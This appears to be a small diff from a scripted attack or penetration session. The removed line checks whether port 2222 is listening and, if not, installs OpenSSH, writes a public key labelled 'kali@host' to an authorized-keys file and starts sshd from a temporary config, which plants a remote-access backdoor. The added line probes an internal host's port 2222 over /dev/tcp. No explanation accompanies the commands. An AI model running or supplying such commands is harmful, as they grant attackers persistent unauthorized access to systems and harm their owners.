@@ -1,1 +1,1 @@
-grep -qi ":08AE" /proc/net/tcp && echo SSHD-LISTEN || { apk add --no-cache openssh >/dev/null 2>&1; PUB="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHz4ixvYbBfcSQKO3RpTop1thSI2mQx6b9E7SQjrXrno kali@host"; echo "$PUB" > /keys/ak; chmod 600 /keys/ak; /usr/sbin/sshd -f /tmp/c; sleep 1; grep -qi ":08AE" /proc/net/tcp && echo SSHD-RESTARTED; }; echo CHK39 # 216102054
+IP=10.224.0.100; timeout 6 bash -c "exec 3<>/dev/tcp/$IP/2222 && head -c 30 <&3" 2>/dev/null; echo; echo DIRECT40 # 2954514500
